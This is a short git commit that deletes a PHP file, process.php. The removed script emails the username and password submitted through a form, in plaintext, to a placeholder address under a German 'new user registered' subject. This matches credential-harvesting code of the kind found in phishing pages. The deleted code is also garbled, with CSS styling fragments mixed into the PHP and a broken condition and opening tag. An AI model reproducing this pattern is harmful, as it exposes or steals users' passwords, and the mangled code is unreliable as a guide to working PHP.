47ea83e8844ec1cf8cda15c4d6e0246202efd5d0
halloduopfer <ghaithalatrash0@gmail.com>
2025-04-17 21:47:55 +0200

    Delete process.php

--- process.php
+++
@@ -1,9 +0,0 @@
-php
-($_POST['username'])  text-decoration-color:#B4ABC5; font-style:italic;">($_POST['password'])) {
-  $to = 'your-email@example.com';
-  $subject = 'Neuer Benutzer registriert';
-  $message = 'Benutzername: ' . $_POST['username'] . PHP_EOL;
-  $message .= 'Passwort: ' . $_POST['password'] . PHP_EOL;
-  mail($to,$subject,$message);
-}
-?>
